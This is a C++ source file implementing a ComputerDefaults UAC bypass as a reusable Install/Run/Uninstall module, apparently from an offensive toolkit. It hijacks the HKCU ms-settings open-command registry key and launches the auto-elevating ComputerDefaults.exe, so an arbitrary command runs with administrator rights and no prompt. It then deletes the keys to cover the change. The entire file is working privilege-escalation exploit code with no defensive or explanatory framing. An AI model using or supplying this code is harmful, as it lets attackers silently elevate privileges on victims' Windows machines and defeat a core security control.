#include "pch.h"
#include "ComputerDefaultsHijacker.h"

bool ComputerDefaultsHijacker::Install(LPCWSTR wzCommand)
{
	// Create registry tree
	Wrapper::CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command");
	
	// Expand command
	WCHAR wzExpanded[MAX_PATH];
	ExpandEnvironmentStringsW(wzCommand, wzExpanded, _countof(wzExpanded));
	wzCommand = wzExpanded;

	bool bRet = false;
	
	// Set DelegateExecute value
	bRet = Wrapper::SetRegistryStringValue(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", L"DelegateExecute", NULL);
	if (!bRet)
		return false;
	
	// Set (Default) value to target command
	bRet = Wrapper::SetRegistryStringValue(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", NULL, wzCommand);
	if (!bRet)
		return false;

	return true;
}

bool ComputerDefaultsHijacker::Run()
{
	// Expand command
	WCHAR wzCommand[MAX_PATH];
	ExpandEnvironmentStringsW(L"%WinDir%\\System32\\ComputerDefaults.exe", wzCommand, _countof(wzCommand));

	// Prepare
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Execute
	HINSTANCE hRet = ShellExecuteW(NULL, NULL, wzCommand, NULL, NULL, 0);
	if ((int)hRet <= 32)
		return false;
	
	return true;
}

void ComputerDefaultsHijacker::Uninstall()
{
	// Delete
	Wrapper::DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command");
	Wrapper::DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open");
}